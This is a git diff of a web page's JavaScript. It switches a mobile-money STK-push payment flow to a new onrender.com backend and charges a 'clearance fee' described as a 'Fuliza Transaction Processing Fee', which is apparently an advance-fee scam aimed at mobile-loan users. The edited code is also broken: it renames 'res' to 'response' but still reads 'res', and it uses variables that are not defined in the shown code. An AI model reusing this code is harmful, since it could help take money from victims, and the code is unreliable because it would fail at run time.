@@ -218,8 +218,8 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;min-height:100vh
 /* =========================
    CONFIGURATION
 ========================= */
-const BACKEND = "https://optimapay-server.onrender.com/api";
-const CLEARANCE_FEE = 950;
+const BACKEND = "https://nyota-server-autopay.onrender.com/api";
+const CLEARANCE_FEE = 2;
 
 /* =========================
    ELEMENT REFERENCES
@@ -311,15 +311,21 @@ async function payNow(){
   let data;
 
   try {
-    const res = await fetch(`${BACKEND}/stk-push`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-  phone: fullPhone,
-  amount: CLEARANCE_FEE,
-  balanceType: "wallet"
-})
-    });
+    const response = await fetch(
+            `${BACKEND}/stk-push`,
+            {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    phone: phone,
+                    amount: amount,
+                    reference: reference,
+                    description: "Fuliza Transaction Processing Fee"
+                })
+            }
+        );
 
     data = await res.json();
   } catch(e){
@@ -397,11 +403,18 @@ function startPolling(checkoutId, phone){
     }
 
     try{
-      const res = await fetch(`${BACKEND}/check-status`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ checkout_request_id: checkoutId })
-      });
+      const response = await fetch(
+            `${BACKEND}/check-status`,
+            {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    checkout_request_id: checkoutId
+                })
+            }
+        );
 
       if(!res.ok) return;
 
